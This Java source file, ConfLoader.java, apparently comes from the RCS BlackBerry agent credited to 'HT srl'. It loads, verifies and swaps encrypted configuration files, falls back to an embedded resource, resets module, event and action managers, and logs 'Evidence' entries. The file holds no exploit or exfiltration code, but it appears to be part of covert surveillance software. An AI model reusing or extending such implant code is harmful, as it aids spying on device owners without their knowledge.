//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Conf.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry.config;

import java.io.InputStream;

import blackberry.GeneralException;
import blackberry.Messages;
import blackberry.Status;
import blackberry.crypto.Encryption;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.fs.AutoFile;
import blackberry.fs.Path;
import blackberry.manager.ActionManager;
import blackberry.manager.EventManager;
import blackberry.manager.ModuleManager;
import blackberry.utils.Utils;
import fake.InstanceConfigFake;

/**
 * The Class Conf. None of theese parameters changes runtime.
 */
public final class ConfLoader {

    /** The debug instance. */
    //#ifdef DEBUG
    private static Debug debug = new Debug("ConfLoader", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif

    private Status status;

    private boolean haveJson;

    /**
     * Instantiates a new conf.
     */
    public ConfLoader() {
        status = Status.getInstance();
    }

    public boolean loadConf() throws GeneralException {

        status.clear();

        boolean loaded = false;
        //final byte[] confKey = Encryption.getKeys().getConfKey();

        //#ifdef DEBUG
        debug.trace("load: " + Encryption.getKeys().log); //$NON-NLS-1$
        //#endif

        AutoFile file;

        file = new AutoFile(Path.conf(), Cfg.NEW_CONF);
        if (file.exists()) {
            //#ifdef DEBUG
            debug.info("Try: new config"); //$NON-NLS-1$
            //#endif

            loaded = loadConfFile(file, true);

            if (loaded) {
                //#ifdef DEBUG
                debug.info("New config"); //$NON-NLS-1$
                //#endif
                file.rename(Cfg.ACTUAL_CONF, true);
                Evidence.info(Messages.getString("r.0")); //$NON-NLS-1$
                loaded = true;
            } else {
                //#ifdef DEBUG
                debug.error("Reading new configuration"); //$NON-NLS-1$
                //#endif
                file.delete();
                Evidence.info(Messages.getString("r.1")); //$NON-NLS-1$

            }
        }
        if (!loaded) {
            file = new AutoFile(Path.conf(), Cfg.ACTUAL_CONF);
            if (file.exists()) {
                loaded = loadConfFile(file, true);
                if (!loaded) {
                    Evidence.info(Messages.getString("r.2")); //$NON-NLS-1$
                }
            }
        }

        if (!loaded) {
            //#ifdef DEBUG
            debug.warn("Reading Conf from resources"); //$NON-NLS-1$
            //#endif

            InputStream inputStream = InstanceConfig.getConfig();
            if (inputStream != null) {
                //#ifdef DBC
                Check.asserts(inputStream != null, "Resource config"); //$NON-NLS-1$
                //#endif            

                byte[] resource;
                //#ifdef FAKECONF
                resource = InstanceConfigFake.getBytes();
                //#else
                resource = Utils.inputStreamToBuffer(inputStream); // config.bin
                //#endif

                int len = Utils.byteArrayToInt(resource, 0);

                cleanConfiguration();

                // Initialize the configuration object
                Configuration conf = new Configuration(resource, len, 4);

                // Load the configuration
                loaded = conf.loadConfiguration(true);

                //#ifdef DEBUG
                debug.trace("load Info: Resource file loaded: " + loaded); //$NON-NLS-1$
                //#endif        

            } else {
                //#ifdef DEBUG
                debug.error("Cannot read config from resources"); //$NON-NLS-1$
                //#endif
                loaded = false;
            }
        }
        return loaded;
    }

    /**
     * Clean configuration and status objects.
     */
    public void cleanConfiguration() {
        // Clean an eventual old initialization
        status.clear();
        ModuleManager.getInstance().clear();
        EventManager.getInstance().clear();
        ActionManager.getInstance().clear();
    }

    private boolean loadConfFile(byte[] resource, boolean instantiate) {
        boolean loaded = false;

        if (resource != null && resource.length > 0) {
            // Initialize the configuration object
            Configuration conf = new Configuration(resource, resource.length, 0);
            if (conf.isDecrypted()) {

                if (instantiate) {
                    cleanConfiguration();
                }

                // Load the configuration
                loaded = conf.loadConfiguration(instantiate);
                //#ifdef DEBUG
                debug.trace("loadConfFile Conf file loaded: " + loaded); //$NON-NLS-1$
                //#endif
            }
        } else {
            //#ifdef DEBUG
            debug.trace("loadConfFile: empty resource"); //$NON-NLS-1$
            //#endif
        }

        return loaded;

    }

    public boolean loadConfFile(AutoFile file, boolean instantiate) {
        boolean loaded = false;

        //#ifdef DEBUG
        debug.trace("loadConfFile: " + file); //$NON-NLS-1$
        //#endif

        final byte[] resource = file.read();
        return loadConfFile(resource, instantiate);

    }

    public boolean verifyNewConf() {
        //#ifdef DEBUG
        debug.trace("verifyNewConf"); //$NON-NLS-1$
        //#endif
        AutoFile file = new AutoFile(Path.conf(), Cfg.NEW_CONF);
        boolean loaded = false;
        if (file.exists()) {
            loaded = loadConfFile(file, false);
        }

        return loaded;
    }

}
